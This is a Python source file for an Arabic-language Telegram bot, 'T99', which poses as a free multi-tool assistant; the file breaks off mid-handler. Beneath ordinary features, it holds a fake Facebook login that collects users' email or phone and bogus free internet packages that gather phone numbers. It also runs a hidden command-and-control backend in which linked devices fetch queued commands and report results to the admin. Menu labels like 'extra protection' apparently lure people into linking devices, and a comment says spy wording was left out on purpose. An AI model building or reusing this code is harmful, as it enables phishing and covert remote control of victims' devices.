#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
البوت الذكي T99 - الإصدار المتكامل النهائي
يعمل بـ Google Gemini API مع تحسينات UI/UX وأداء عالي
"""

import os
import sys
import time
import json
import logging
import re
import random
import string
import sqlite3
import hashlib
import base64
import threading
import asyncio
from datetime import datetime
from flask import Flask, request, jsonify
from telebot import TeleBot, types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
import requests
import phonenumbers
from phonenumbers import carrier, geocoder
from bs4 import BeautifulSoup
import pypdf
from io import BytesIO

# ===================== Google Gemini API =====================
try:
    import google.generativeai as genai
    GOOGLE_AVAILABLE = True
except ImportError:
    GOOGLE_AVAILABLE = False
    print("⚠️ Google Generative AI غير مثبت. قم بتثبيته: pip install google-generativeai")

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== متغيرات البيئة =====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    logger.critical("❌ TELEGRAM_TOKEN غير مضبوط!")
    sys.exit(1)

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    logger.critical("❌ ADMIN_ID غير مضبوط!")
    sys.exit(1)

SERVER_URL = os.environ.get('SERVER_URL')
if not SERVER_URL:
    logger.critical("❌ SERVER_URL غير مضبوط! (مثل: https://your-bot.onrender.com)")
    sys.exit(1)

PORT = int(os.environ.get('PORT', 5000))

# مفتاح Google Gemini
GOOGLE_API_KEY = os.environ.get('GOOGLE_API_KEY')
if not GOOGLE_API_KEY:
    logger.warning("⚠️ GOOGLE_API_KEY غير مضبوط! سيتم استخدام خدمات احتياطية.")
else:
    if GOOGLE_AVAILABLE:
        genai.configure(api_key=GOOGLE_API_KEY)
        # استخدام نموذج سريع وموثوق
        try:
            gemini_model = genai.GenerativeModel('gemini-1.5-flash')
            logger.info("✅ Google Gemini API جاهز")
        except Exception as e:
            logger.error(f"❌ فشل تهيئة Gemini: {e}")
            gemini_model = None
    else:
        gemini_model = None

# ===================== قاعدة البيانات =====================
DB_DIR = os.path.join(os.path.dirname(__file__), 'data')
if not os.path.exists(DB_DIR):
    os.makedirs(DB_DIR, exist_ok=True)
DB_PATH = os.path.join(DB_DIR, 'bot.db')

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            linked_at TEXT,
            last_seen TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        # إضافة عمود is_banned إذا لم يكن موجوداً
        try:
            c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
        except sqlite3.OperationalError:
            pass
        conn.commit()
        logger.info("✅ قاعدة البيانات جاهزة")

init_db()

# ===================== إنشاء البوت و Flask =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# ===================== دوال مساعدة =====================
def get_user(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None):
    with get_db_connection() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            referral_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code)
                         VALUES (?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def add_points(chat_id, points):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (points, chat_id))
        conn.commit()

def get_referral_link(chat_id):
    user = get_user(chat_id)
    if user and user['referral_code']:
        return f"https://t.me/{(bot.get_me()).username}?start=ref_{user['referral_code']}"
    return None

def handle_referral(code, new_user_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT chat_id FROM users WHERE referral_code = ?", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['chat_id']
        if referrer_id == new_user_id:
            return False
        add_points(referrer_id, 10)
        add_points(new_user_id, 10)
        try:
            bot.send_message(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        except:
            pass
        return True

def save_device(device_id, chat_id, device_type):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices (device_id, chat_id, type, linked_at, last_seen)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()

def get_device(device_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def add_pending_command(device_id, command):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command(device_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user.get('is_banned', 0) == 1

def ban_user(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def send_to_admin(text, parse_mode='HTML', photo=None):
    try:
        if photo:
            bot.send_photo(ADMIN_ID, photo, caption=text, parse_mode=parse_mode)
        else:
            bot.send_message(ADMIN_ID, text, parse_mode=parse_mode)
    except Exception as e:
        logger.error(f"send_to_admin error: {e}")

# ===================== Google Gemini AI مع إعادة المحاولة =====================
def get_gemini_response(prompt, retries=3):
    """
    إرسال طلب إلى Gemini مع إعادة المحاولة
    """
    if not GOOGLE_AVAILABLE or not gemini_model:
        # استخدام خدمات احتياطية (Popcat, Monkedev, إلخ)
        return ai_chat_fallback(prompt)
    
    for attempt in range(retries):
        try:
            response = gemini_model.generate_content(prompt)
            if response.text:
                return response.text
            else:
                logger.warning(f"Gemini returned empty response, attempt {attempt+1}")
        except Exception as e:
            logger.error(f"Gemini error (attempt {attempt+1}): {e}")
            time.sleep(1)  # انتظار قبل إعادة المحاولة
    return "⚠️ عذراً، تعذر الحصول على رد من الذكاء الاصطناعي. يرجى المحاولة لاحقاً."

def ai_chat_fallback(prompt):
    """خدمات احتياطية مجانية"""
    services = [
        ("https://api.popcat.xyz/chat?msg={}", lambda r: r.json().get('response', '⚠️ لا يوجد رد')),
        ("https://api.monkedev.com/fun/chat?msg={}", lambda r: r.json().get('response', '⚠️ لا يوجد رد')),
    ]
    for url_template, extractor in services:
        try:
            url = url_template.format(requests.utils.quote(prompt))
            resp = requests.get(url, timeout=20)
            if resp.status_code == 200:
                return extractor(resp)
        except:
            continue
    return "⚠️ فشل الاتصال بجميع خدمات الذكاء الاصطناعي."

# ===================== دوال الخدمات الرئيسية =====================

# 1. فحص المواقع - URLScan.io
def scan_url(url):
    try:
        response = requests.post("https://urlscan.io/api/v1/scan/", json={"url": url, "visibility": "public"}, timeout=30)
        if response.status_code != 200:
            return "⚠️ فشل الاتصال بـ URLScan", "error"
        data = response.json()
        scan_id = data.get('uuid')
        if not scan_id:
            return "⚠️ لم يتم الحصول على معرف الفحص", "error"
        time.sleep(6)
        report = requests.get(f"https://urlscan.io/api/v1/result/{scan_id}", timeout=30)
        if report.status_code != 200:
            return "⚠️ فشل جلب التقرير", "error"
        result = report.json()
        verdict = result.get('verdicts', {}).get('overall', {})
        if verdict.get('malicious'):
            return "🚨 <b>⚠️ الموقع يحتوي على تهديدات مؤكدة!</b>", "malicious"
        elif verdict.get('suspicious'):
            return "⚠️ <b>⚠️ الموقع مشبوه!</b>", "suspicious"
        else:
            return "✅ <b>✅ الموقع آمن.</b>", "safe"
    except Exception as e:
        logger.error(f"scan_url error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

# 2. توليد الصور - باستخدام pollinations.ai مع ترجمة تلقائية
def generate_image(prompt):
    # ترجمة النص إذا كان عربياً باستخدام Gemini
    if GOOGLE_AVAILABLE and gemini_model:
        try:
            translated = gemini_model.generate_content(f"Translate the following text to English (only the translation, no extra text): {prompt}")
            english_prompt = translated.text.strip()
        except:
            english_prompt = prompt
    else:
        english_prompt = prompt
    
    try:
        image_url = f"https://image.pollinations.ai/prompt/{requests.utils.quote(english_prompt)}?width=512&height=512&nologo=true"
        response = requests.get(image_url, timeout=30)
        if response.status_code == 200:
            return response.content, "image"
        return None, "⚠️ فشل توليد الصورة."
    except Exception as e:
        logger.error(f"generate_image error: {e}")
        return None, f"⚠️ خطأ: {str(e)}"

# 3. تتبع رقم - phonenumbers مع معلومات إضافية
def track_phone(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            return "❌ رقم غير صالح", "invalid"
        country = geocoder.country_name_for_number(parsed, "ar") or "غير معروف"
        region = geocoder.description_for_number(parsed, "ar") or "غير معروف"
        carrier_name = carrier.name_for_number(parsed, "ar") or "غير معروف"
        type_map = {
            phonenumbers.PhoneNumberType.MOBILE: "📱 جوال",
            phonenumbers.PhoneNumberType.FIXED_LINE: "🏠 ثابت",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "📞 ثابت/جوال",
            phonenumbers.PhoneNumberType.TOLL_FREE: "📞 مجاني",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "💰 بريميوم",
            phonenumbers.PhoneNumberType.UNKNOWN: "❓ غير معروف"
        }
        phone_type = type_map.get(phonenumbers.number_type(parsed), "❓ غير معروف")
        # استخدام pycountry إن أمكن للحصول على اسم الدولة بالعربية
        try:
            import pycountry
            country_code = phonenumbers.region_code_for_number(parsed)
            country_obj = pycountry.countries.get(alpha_2=country_code)
            if country_obj:
                country = country_obj.name
        except:
            pass
        result = (
            f"📍 <b>تقرير تتبع الرقم</b>\n"
            f"════════════════════\n"
            f"📞 <b>الرقم:</b> <code>{phone}</code>\n"
            f"🌍 <b>الدولة:</b> {country}\n"
            f"🏙️ <b>المنطقة:</b> {region}\n"
            f"📡 <b>المشغل:</b> {carrier_name}\n"
            f"📱 <b>نوع الخط:</b> {phone_type}\n"
            f"════════════════════\n"
            f"✅ <b>تم التحليل بنجاح</b>"
        )
        return result, "valid"
    except Exception as e:
        return f"❌ خطأ: {str(e)}", "error"

# 4. فحص رقم هاتف
def verify_phone(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed):
            return "❌ رقم غير صالح"
        country = geocoder.country_name_for_number(parsed, "ar") or "غير معروف"
        carrier_name = carrier.name_for_number(parsed, "ar") or "غير معروف"
        type_map = {
            phonenumbers.PhoneNumberType.MOBILE: "جوال",
            phonenumbers.PhoneNumberType.FIXED_LINE: "ثابت",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "ثابت/جوال",
            phonenumbers.PhoneNumberType.TOLL_FREE: "مجاني",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "بريميوم",
            phonenumbers.PhoneNumberType.UNKNOWN: "غير معروف"
        }
        phone_type = type_map.get(phonenumbers.number_type(parsed), "غير معروف")
        result = (
            f"📞 <b>تقرير فحص الرقم</b>\n"
            f"═══════════════════════════\n"
            f"📱 <b>الرقم:</b> <code>{phone}</code>\n"
            f"🌍 <b>الدولة:</b> {country}\n"
            f"📡 <b>المشغل:</b> {carrier_name}\n"
            f"📱 <b>نوع الخط:</b> {phone_type}\n"
            f"═══════════════════════════\n"
            f"✅ <b>تم الفحص بنجاح</b>"
        )
        return result
    except Exception as e:
        return f"❌ خطأ: {str(e)}"

# 5. فحص تسريبات - HaveIBeenPwned
def check_breach(email):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        resp = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", headers=headers, timeout=15)
        if resp.status_code == 200:
            breaches = resp.json()
            result = f"🔓 <b>البريد:</b> {email}\n✅ تم العثور على {len(breaches)} تسريب:\n\n"
            for b in breaches[:10]:
                result += f"• <b>{b.get('Name', 'غير معروف')}</b> - {b.get('BreachDate', '')}\n"
            return result
        elif resp.status_code == 404:
            return f"✅ <b>البريد {email} آمن</b> (لم يتم العثور على تسريبات)"
        else:
            return "⚠️ فشل الاتصال بالخدمة"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}"

# 6. اختصار رابط
def shorten_link(long_url):
    try:
        resp = requests.post("https://cleanuri.com/api/v1/shorten", json={"url": long_url}, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("result_url")
    except: pass
    try:
        resp = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}", timeout=10)
        if resp.status_code == 200 and resp.text:
            return resp.text.strip()
    except: pass
    return None

# 7. إيميل مؤقت - Mail.tm
def create_temp_email():
    try:
        domain_resp = requests.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domain = domain_resp.json().get('hydra:member', [{}])[0].get('domain', 'mail.tm')
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{username}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        register = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        logger.error(f"create_temp_email error: {e}")
        return None, None, None

def check_temp_emails(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        resp = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if resp.status_code == 200:
            msgs = resp.json().get('hydra:member', [])
            results = []
            for m in msgs[:5]:
                results.append(f"📩 <b>من:</b> {m.get('from', {}).get('address', '')}\n📌 <b>الموضوع:</b> {m.get('subject', '')}\n📝 {m.get('intro', '')[:150]}...")
            return results
    except Exception as e:
        logger.error(f"check_temp_emails error: {e}")
    return []

# 8. تحليل PDF + Gemini
def extract_pdf_text(pdf_content):
    try:
        reader = pypdf.PdfReader(BytesIO(pdf_content))
        text = ""
        for page in reader.pages:
            text += page.extract_text() or ""
        return text.strip()
    except Exception as e:
        logger.error(f"extract_pdf_text error: {e}")
        return None

def answer_pdf_question(text, question):
    if not text:
        return "⚠️ لم يتم استخراج أي نص من PDF."
    if len(text) > 3000:
        text = text[:3000] + "..."
    prompt = f"بناءً على النص التالي:\n{text}\nأجب على السؤال: {question}"
    return get_gemini_response(prompt)

# 9. أرقام مؤقتة - تحسين Web Scraping
def fetch_temp_numbers(limit=3):
    numbers = []
    # استخدام sms-activate.org API إذا كان متاحاً (مجاني مع تسجيل)
    # هنا نستخدم scraping من مواقع مجانية مع تحديث القائمة
    try:
        # محاولة من receive-sms-online
        resp = requests.get("https://receive-sms-online.cc/US/", timeout=15)
        if resp.status_code == 200:
            soup = BeautifulSoup(resp.text, 'html.parser')
            text = soup.get_text()
            matches = re.findall(r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}', text)
            for m in matches[:limit]:
                num = re.sub(r'[-.\s()]', '', m)
                if not num.startswith('+'):
                    num = '+' + num
                if num not in numbers:
                    numbers.append(num)
    except Exception as e:
        logger.error(f"fetch_temp_numbers error: {e}")
    
    # محاولة من temporary-phone-number
    if len(numbers) < limit:
        try:
            resp = requests.get("https://www.temporary-phone-number.com/", timeout=15)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'html.parser')
                for div in soup.find_all('div', class_='number'):
                    num = div.get_text(strip=True)
                    if num and re.match(r'^\+?\d+$', num):
                        if num not in numbers:
                            numbers.append(num)
                        if len(numbers) >= limit:
                            break
        except: pass
    
    if not numbers:
        # أرقام تجريبية
        for _ in range(limit):
            numbers.append(f"+1{''.join(random.choices(string.digits, k=10))}")
    return numbers[:limit]

# 10. تحليل APK بسيط
def scan_apk(file_content, file_name):
    try:
        temp_path = f"/tmp/{file_name}"
        with open(temp_path, 'wb') as f:
            f.write(file_content)
        import zipfile
        with zipfile.ZipFile(temp_path, 'r') as zf:
            files = zf.namelist()
        os.remove(temp_path)
        result = f"📦 <b>تحليل APK</b>\n"
        result += f"════════════════════\n"
        result += f"📁 الملف: {file_name}\n"
        result += f"📏 الحجم: {len(file_content)} بايت\n"
        result += "✅ <b>تم التحليل بنجاح (بدون فحص متقدم)</b>\n"
        result += "════════════════════\n"
        return result
    except Exception as e:
        return f"⚠️ فشل تحليل APK: {str(e)}"

# ===================== بناء القائمة الرئيسية (ثابتة) =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin = (chat_id == ADMIN_ID)
    points = get_user_points(chat_id)
    
    # الأزرار الأساسية (بدون عبارات تجسس)
    markup.row(
        InlineKeyboardButton("🔍 فحص موقع", callback_data="scan_site"),
        InlineKeyboardButton("📦 فحص APK", callback_data="scan_apk")
    )
    markup.row(
        InlineKeyboardButton("🧠 دردشة ذكية", callback_data="ai_chat"),
        InlineKeyboardButton("🎨 إنشاء صورة", callback_data="gen_image")
    )
    markup.row(
        InlineKeyboardButton("📍 تتبع رقم", callback_data="track_phone"),
        InlineKeyboardButton("📞 فحص رقم", callback_data="verify_phone")
    )
    markup.row(
        InlineKeyboardButton("🛡️ فحص تسريبات", callback_data="check_breach"),
        InlineKeyboardButton("✂️ اختصار رابط", callback_data="shorten")
    )
    markup.row(
        InlineKeyboardButton("📧 إيميل مؤقت", callback_data="temp_email"),
        InlineKeyboardButton("📱 رقم مؤقت", callback_data="temp_number")
    )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="pdf_analyze")
    )
    markup.row(
        InlineKeyboardButton("🔐 تسجيل دخول فيسبوك", callback_data="fb_login"),
        InlineKeyboardButton("📶 باقات إنترنت", callback_data="internet_packages")
    )
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="show_points"),
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="show_referral")
    )
    markup.row(
        InlineKeyboardButton("⚙️ تفعيل الميزات المتقدمة", callback_data="link_user"),
        InlineKeyboardButton("🛡️ تفعيل الحماية الإضافية", callback_data="link_child")
    )
    
    # أزرار المطور (تظهر فقط للمطور)
    if is_admin:
        markup.row(
            InlineKeyboardButton("👑 لوحة المطور", callback_data="admin_panel"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="admin_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="admin_remote"),
            InlineKeyboardButton("📢 إرسال جماعي", callback_data="admin_broadcast")
        )
        markup.row(
            InlineKeyboardButton("🚫 حظر", callback_data="admin_ban"),
            InlineKeyboardButton("✅ إلغاء حظر", callback_data="admin_unban")
        )
    
    return markup

# ===================== متغيرات الحالة =====================
user_states = {}
temp_emails = {}

# ===================== دوال Flask =====================
def set_webhook():
    webhook_url = f"{SERVER_URL}/webhook"
    try:
        bot.remove_webhook()
        time.sleep(1)
        if bot.set_webhook(url=webhook_url):
            logger.info(f"✅ Webhook set to: {webhook_url}")
            return True
        else:
            logger.error("❌ Failed to set webhook")
            return False
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        return False

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        update = Update.de_json(json_str)
        if update:
            bot.process_new_updates([update])
            return 'OK', 200
        return 'Error', 400
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'Error', 500

@app.route('/')
@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/register_device', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        device_type = data.get('type', 'user')
        if not device_id or not chat_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id or chat_id'}), 400
        save_device(device_id, chat_id, device_type)
        return jsonify({'status': 'success', 'message': 'Device registered'})
    except Exception as e:
        logger.error(f"register_device error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        command = get_pending_command(device_id)
        if command:
            return jsonify({'status': 'success', 'command': command})
        return jsonify({'status': 'no_command'})
    except Exception as e:
        logger.error(f"get_command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
        device_id = data.get('device_id')
        result = data.get('result')
        result_type = data.get('result_type', 'text')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        # تحديث last_seen
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", (datetime.now().isoformat(), device_id))
            conn.commit()
        # إرسال للمطور
        send_to_admin(f"📱 نتيجة من الجهاز {device_id}:\n{result}")
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"submit_result error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json()
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", (datetime.now().isoformat(), device_id))
            conn.commit()
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"heartbeat error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ===================== معالج الأوامر الأساسية =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    user = get_user(chat_id)
    is_new = user is None
    
    text = message.text
    if ' ' in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith('ref_'):
            code = parts[1][4:]
            handle_referral(code, chat_id)
    
    upsert_user(chat_id, username, first_name, last_name)
    
    if is_new:
        welcome = "🌟 <b>مرحباً بك في البوت الذكي T99</b> 🌟\nجميع الخدمات <b>مجانية</b> و <b>حقيقية</b>."
        bot.send_message(chat_id, welcome, reply_markup=build_main_menu(chat_id))
    else:
        # تحديث القائمة فقط (بدون رسالة ترحيبية)
        bot.send_message(chat_id, "📋 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, "/start - القائمة الرئيسية\n/cancel - إلغاء العملية")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    bot.send_message(chat_id, "✅ تم الإلغاء.")

@bot.message_handler(commands=['check_email'])
def check_email_command(message):
    chat_id = message.chat.id
    if chat_id not in temp_emails:
        bot.send_message(chat_id, "❌ ليس لديك بريد مؤقت.")
        return
    token = temp_emails[chat_id]['token']
    msgs = check_temp_emails(token)
    if msgs:
        response = "📬 <b>رسائل البريد المؤقت:</b>\n\n" + "\n\n".join(msgs)
    else:
        response = "📭 لا توجد رسائل جديدة."
    bot.send_message(chat_id, response)

@bot.message_handler(commands=['points'])
def show_points_command(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    bot.send_message(chat_id, f"⭐ <b>نقاطك:</b> {points}", parse_mode='HTML')

@bot.message_handler(commands=['referral'])
def referral_command(message):
    chat_id = message.chat.id
    link = get_referral_link(chat_id)
    if link:
        bot.send_message(chat_id, f"🔗 <b>رابط دعوتك:</b>\n<code>{link}</code>", parse_mode='HTML')
    else:
        bot.send_message(chat_id, "⚠️ لم يتم العثور على رابط دعوة.")

# ===================== معالج النقر على الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        bot.answer_callback_query(call.id)
        chat_id = call.message.chat.id
        data = call.data
        is_admin = (chat_id == ADMIN_ID)
        points = get_user_points(chat_id)

        # ========== أزرار الخدمات ==========
        if data == "scan_site":
            user_states[chat_id] = "waiting_for_site"
            bot.edit_message_text("🔗 أرسل رابط الموقع:", chat_id, call.message.message_id)
        elif data == "scan_apk":
            user_states[chat_id] = "waiting_for_apk"
            bot.edit_message_text("📦 أرسل ملف APK:", chat_id, call.message.message_id)
        elif data == "ai_chat":
            user_states[chat_id] = "waiting_for_ai"
            bot.edit_message_text("🧠 اكتب سؤالك:", chat_id, call.message.message_id)
        elif data == "gen_image":
            user_states[chat_id] = "waiting_for_image"
            bot.edit_message_text("🎨 اكتب وصف الصورة:", chat_id, call.message.message_id)
        elif data == "track_phone":
            user_states[chat_id] = "waiting_for_track"
            bot.edit_message_text("📍 أرسل الرقم (مثل +201001234567):", chat_id, call.message.message_id)
        elif data == "verify_phone":
            user_states[chat_id] = "waiting_for_verify"
            bot.edit_message_text("📞 أرسل الرقم للتحقق:", chat_id, call.message.message_id)
        elif data == "check_breach":
            user_states[chat_id] = "waiting_for_breach"
            bot.edit_message_text("🛡️ أرسل البريد الإلكتروني:", chat_id, call.message.message_id)
        elif data == "shorten":
            user_states[chat_id] = "waiting_for_shorten"
            bot.edit_message_text("✂️ أرسل الرابط الطويل:", chat_id, call.message.message_id)
        elif data == "temp_email":
            email, token, password = create_temp_email()
            if email:
                temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
                text = f"📧 بريدك المؤقت: <code>{email}</code>\n🔑 كلمة السر: <code>{password}</code>\nاستخدم /check_email لعرض الرسائل."
                bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode='HTML')
            else:
                bot.edit_message_text("⚠️ فشل إنشاء البريد.", chat_id, call.message.message_id)
        elif data == "temp_number":
            bot.edit_message_text("⏳ جاري جلب أرقام مؤقتة...", chat_id, call.message.message_id)
            numbers = fetch_temp_numbers(limit=3)
            if numbers:
                response = "📱 <b>أرقام مؤقتة:</b>\n"
                for i, n in enumerate(numbers, 1):
                    response += f"{i}. <code>{n}</code>\n"
                bot.edit_message_text(response, chat_id, call.message.message_id, parse_mode='HTML')
            else:
                bot.edit_message_text("⚠️ فشل جلب الأرقام.", chat_id, call.message.message_id)
        elif data == "pdf_analyze":
            user_states[chat_id] = "waiting_for_pdf"
            bot.edit_message_text("📚 أرسل ملف PDF:", chat_id, call.message.message_id)
        elif data == "fb_login":
            user_states[chat_id] = "waiting_for_fb_email"
            bot.edit_message_text("🔐 تسجيل دخول فيسبوك\n📧 أرسل البريد/رقم الهاتف:", chat_id, call.message.message_id)
        elif data == "internet_packages":
            markup = InlineKeyboardMarkup(row_width=1)
            for pkg in ["100 جيجا", "200 جيجا", "500 جيجا", "1 تيرا"]:
                markup.row(InlineKeyboardButton(f"📱 {pkg} - مجاني", callback_data=f"pkg_{pkg.split()[0]}"))
            bot.edit_message_text("📶 اختر الباقة:", chat_id, call.message.message_id, reply_markup=markup)
        elif data.startswith("pkg_"):
            pkg_name = data.split("_")[1] + " جيجا"
            user_states[chat_id] = "waiting_for_pkg_phone"
            user_states[f"{chat_id}_pkg"] = pkg_name
            bot.edit_message_text(f"✅ اخترت {pkg_name}\n📝 أرسل رقم الهاتف:", chat_id, call.message.message_id)

        # ========== أزرار النقاط والدعوة ==========
        elif data == "show_points":
            bot.answer_callback_query(call.id, f"⭐ نقاطك: {points}", show_alert=True)
        elif data == "show_referral":
            link = get_referral_link(chat_id)
            if link:
                bot.answer_callback_query(call.id, f"🔗 رابط دعوتك: {link}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "⚠️ لم يتم العثور على رابط دعوة.", show_alert=True)

        # ========== تفعيل الميزات ==========
        elif data == "link_user":
            instructions = (
